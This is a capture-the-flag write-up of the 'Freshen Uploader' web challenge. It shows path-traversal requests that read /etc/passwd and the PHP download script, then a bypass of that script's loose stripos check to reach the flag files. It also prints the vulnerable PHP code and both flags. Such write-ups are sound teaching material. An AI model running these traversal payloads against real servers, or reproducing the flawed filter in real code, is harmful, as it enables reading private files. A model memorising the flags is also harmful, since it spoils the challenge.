# Freshen Uploader

## Problem

In this year, we stopped using Windows so you can't use DOS tricks!

http://fup.chal.ctf.westerns.tokyo/

Flag 1: TWCTF{then_can_y0u_read_file_list?}

Flag 2: TWCTF{php_is_very_secure}


## Flag 1

If you go to the webpage for the challenge you will have a list of files that you can download. 

If you view source you can see that the browser is making a GET request to:
http://fup.chal.ctf.westerns.tokyo/download.php?f= then the name of the file.

The first thing I tried was local file inclusion because you are giving the name of the file you want to download in the GET request. 

http://fup.chal.ctf.westerns.tokyo/download.php?f=../../../../../../etc/passwd

Works!!

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
unscd:x:112:116::/var/lib/unscd:/bin/false
twctf:x:1000:1000:Ubuntu:/home/twctf:/bin/bash
zabbix:x:113:117::/nonexistent:/bin/false
```

After that I had to think what is a file that I know is on the system and can help get the flag, download.php is on the system because they call it. 

http://fup.chal.ctf.westerns.tokyo/download.php?f=download.php

It download a file that was empty, so that didn't work so I figured it was looking for download.php in the wrong directory 

http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php

Worked!!

```
<?php
// TWCTF{then_can_y0u_read_file_list?}
$filename = $_GET['f'];
if(stripos($filename, 'file_list') != false) die();
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename='$filename'");
readfile("uploads/$filename");
```

## Flag 2

Flag 1 tells you that the next task is to try to download file_list. Reading the code the only thing that stuck out to me was the if statement 

Stripos will return the location of when it found the first parameter in the second parameter or false if not found
```
stripos('a', 'brandon') = 2

stripos('a', 'apple') = 0

stripos('q', 'apple') = false
```

In PHP, == or != will only compare value and not type, === will compare both value and type 

```
0 == false  = True

0 === false = False

1 == true   = True

1 === true  = Flase 
```
 
We need to get past the if statement in order for us to download the file, to achieve this stripos would have to output 0 or false

In order for stripos to output a 0 file_list would have to be the start of the query


/download?f=file_list 

This query downloads an empty file, that means that it was looking in the wrong directory for file_list and it was not found. 

/download?f=../file_list

This query doesn't download a file because the stripos will return 3 making the script die 

So we know that file_list needs to be at he begining of the file name as well as we have to go to the correct directory

/download?f=file_list/../../file_list.php 

Works!! 

What this is doing is saying look in the file_list directory wait go back a directory so we are back in the orginal location then do back one more directory and grab the file_list.php file

```
<?php
$files = [
  [FALSE, 1, 'test.cpp', 192, '6a92b449761226434f5fce6c8e87295a'],
  [FALSE, 2, 'test.c', 325, '27259bca9edf408829bb749969449550'],
  [TRUE, 3, 'flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213', 1337, 'flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213'],
  [FALSE, 4, 'test.py', 94, '951470281beb8a490a941ac73bd10953'],
]; 
```

YAY!! 

If you submit the query

download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213

```
TWCTF{php_is_very_secure}
```
